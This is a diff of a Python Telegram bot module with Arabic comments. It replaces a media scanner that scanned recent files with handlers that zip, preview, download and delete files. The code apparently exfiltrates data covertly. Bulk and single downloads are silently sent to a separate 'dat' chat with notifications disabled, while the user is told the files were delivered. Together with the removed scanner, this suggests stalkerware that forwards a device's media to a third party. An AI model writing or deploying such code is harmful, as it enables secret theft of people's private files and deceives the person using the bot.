-            """, commit=True)
-
-            # VACUUM لتحسين المساحة
-            conn = self._db_connect()
-            if conn:
+            # التأكد من وجود المجلد المؤقت
+            os.makedirs(T, exist_ok=True)
+            zip_path = os.path.join(T, f"bulk_{cat}_p{page}_{int(time.time())}_{random.randint(1000,9999)}.zip")
+            
+            with self._lock:
                 try:
-                    conn.execute("VACUUM")
-                    conn.commit()
-                finally:
-                    conn.close()
+                    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
+                        for item in items:
+                            path = item.get('path')
+                            if path and os.path.exists(path):
+                                try:
+                                    zf.write(path, os.path.basename(path))
+                                except Exception as e:
+                                    logging.error(f"Error adding file to zip: {e}")
 
+                    # التحقق من إنشاء ZIP
+                    if not os.path.exists(zip_path) or os.path.getsize(zip_path) == 0:
+                        raise Exception("Failed to create zip file")
+
+                    target = getattr(self.tg, 'dat', cid)
+                    with open(zip_path, 'rb') as f:
+                        resp = self.tg._api("sendDocument", {
+                            "chat_id": target,
+                            "caption": f"📦 تحميل جماعي | الفئة: {cat} | الصفحة {page+1} | {len(items)} ملف",
+                            "disable_notification": True
+                        }, {"document": f})
+                        
+                    if resp and resp.get('ok'):
+                        self.tg._api("sendMessage", {"chat_id": cid, "text": f"✅ تم إرسال {len(items)} ملفاً مضغوطاً."})
+                    else:
+                        self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ فشل إرسال الملف المضغوط."})
+                        
+                except Exception as e:
+                    logging.error(f"Bulk download error: {e}")
+                    self.tg._api("sendMessage", {"chat_id": cid, "text": f"❌ فشل إنشاء ملف ZIP: {str(e)[:100]}"})
+                finally:
+                    if os.path.exists(zip_path):
+                        self._safe_remove(zip_path)
+                    gc.collect()
+                    
         except Exception as e:
-            logging.error(f"Cleanup error: {e}")
+            logging.error(f"Bulk handler error: {e}")
+            self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ خطأ في معالجة التحميل الجماعي."})
+
+    # ========== معاينة الصورة ==========
+    def _preview(self, cid, path):
+        """إرسال معاينة للصورة"""
+        if not self._check_dependencies():
+            return
+
+        if not os.path.exists(path):
+            self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ الملف غير موجود."})
+            return
+
+        # ✅ الخطأ 1: التحقق من امتداد الفيديو باستخدام الدالة المخصصة
+        if self._is_video_file(path):
+            self.tg._api("sendMessage", {"chat_id": cid, "text": "📽 معاينة الفيديو غير مدعومة. يمكنك تحميله."})
+            return
+
+        thumb = None
+        try:
+            thumb = self._thumbnail(path)
+            if not thumb:
+                self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ لا يمكن إنشاء معاينة لهذا الملف."})
+                return
+
+            with open(thumb, 'rb') as photo:
+                resp = self.tg._api("sendPhoto", {
+                    "chat_id": cid, 
+                    "caption": "🔍 معاينة (ستُحذف بعد 30 ثانية)"
+                }, {"photo": photo})
+                
+            if resp and resp.get('ok'):
+                msg_id = resp['result']['message_id']
+                # جدولة الحذف باستخدام threading.Timer
+                self._schedule_delete(cid, msg_id, 30)
+            else:
+                self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ فشل في إرسال المعاينة."})
+                
+        except Exception as e:
+            logging.error(f"Preview error: {e}")
+            self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ خطأ في إرسال المعاينة."})
+        finally:
+            if thumb and os.path.exists(thumb):
+                self._safe_remove(thumb)
+
+    # ========== تحميل الملف مضغوطاً ==========
+    def _download(self, cid, path, label):
+        """تحميل ملف مفرد كـ ZIP"""
+        if not self._check_dependencies():
+            return
+
+        if not os.path.exists(path):
+            self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ الملف غير موجود."})
+            return
+
+        try:
+            file_size = os.path.getsize(path)
+        except Exception:
+            file_size = 0
+        if file_size > 45 * 1024 * 1024:
+            self.tg._api("sendMessage", {"chat_id": cid, "text": "⚠️ حجم الملف كبير جداً (>45MB). لا يمكن إرساله عبر البوت."})
+            return
+
+        # التأكد من وجود المجلد المؤقت
+        os.makedirs(T, exist_ok=True)
+        zip_path = os.path.join(T, f"dl_{int(time.time())}_{random.randint(1000,9999)}.zip")
+        
+        try:
+            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
+                zf.write(path, os.path.basename(path))
+
+            if not os.path.exists(zip_path) or os.path.getsize(zip_path) == 0:
+                raise Exception("Failed to create zip")
+
+            target_chat = getattr(self.tg, 'dat', cid)
+            with open(zip_path, 'rb') as f:
+                self.tg._api("sendDocument", {
+                    "chat_id": target_chat, 
+                    "caption": f"📤 {label}"
+                }, {"document": f})
+                
+        except Exception as e:
+            logging.error(f"Download error: {e}")
+            self.tg._api("sendMessage", {"chat_id": cid, "text": f"❌ فشل في إرسال الملف: {str(e)[:100]}"})
+        finally:
+            if os.path.exists(zip_path):
+                self._safe_remove(zip_path)
+            gc.collect()
+
+    # ========== حذف الملف نهائياً ==========
+    def _delete(self, cid, path, label, cat=None, page=None):
+        """حذف ملف مع إمكانية العودة"""
+        if not self._check_dependencies():
+            return
+
+        try:
+            if os.path.exists(path):
+                os.remove(path)
+                
+                # إزالة من قاعدة البيانات إذا كان متوفراً
+                if self.sc and hasattr(self.sc, 'remove_from_db'):
+                    try:
+                        self.sc.remove_from_db(path)
+                    except Exception as e:
+                        logging.error(f"Remove from DB error: {e}")
+                
+                msg = f"🗑 تم حذف #{label} نهائياً."
+                if cat is not None and page is not None:
+                    msg += f"\n🔙 للعودة: /gallery_{cat}_{page}"
+                    
+                self.tg._api("sendMessage", {"chat_id": cid, "text": msg})
+            else:
+                self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ الملف غير موجود مسبقاً."})
+        except Exception as e:
+            logging.error(f"Delete error: {e}")
+            self.tg._api("sendMessage", {"chat_id": cid, "text": f"❌ فشل في حذف الملف: {str(e)[:100]}"})
         finally:
             gc.collect()
 
-    # ========== تشغيل المسح ==========
-    def run_scan(self, cleanup_first=False, limit=100, hours=48):
-        """تشغيل مسح جديد مع إمكانية تحديد عدد الملفات وساعات البحث."""
-        if cleanup_first:
-            self._cleanup_db()
+    # ========== جدولة حذف الرسالة (باستخدام threading.Timer) ==========
+    def _schedule_delete(self, cid, msg_id, delay_seconds):
+        """جدولة حذف رسالة بعد فترة زمنية باستخدام threading.Timer"""
+        def delete_task():
+            try:
+                self._delete_message(cid, msg_id)
+            except Exception as e:
+                logging.error(f"Delete task error: {e}")
+            finally:
+                # ✅ الخطأ 2: تنظيف المؤقتات المنتهية
+                self._timers = [t for t in self._timers if t.is_alive()]
+        
+        timer = threading.Timer(delay_seconds, delete_task)
+        timer.daemon = True
+        timer.start()
+        self._timers.append(timer)
 
-        def _task():
-            files = self._fast_scan(limit=limit, hours=hours)
-            if files:
-                self._process_files(files)
+    # ========== حذف رسالة ==========
+    def _delete_message(self, cid, msg_id):
+        """حذف رسالة من المحادثة"""
+        if not self._check_dependencies():
+            return
+            
+        try:
+            self.tg._api("deleteMessage", {"chat_id": cid, "message_id": msg_id})
+        except Exception as e:
+            logging.error(f"Delete message error: {e}")
 
-        threading.Thread(target=_task, daemon=True).start()
+    # ========== تنظيف الموارد عند الإغلاق ==========
+    def cleanup(self):
+        """تنظيف الموارد وإلغاء جميع المؤقتات"""
+        self._cleanup_timers()
+        self._cleanup_old_temp()
+
 
 # ========== دالة المصنع ==========
-def create(det=None, ui=None):
-    return MediaScanner(det, ui)
+def create(sc=None, tg=None):
+    return G(sc, tg)
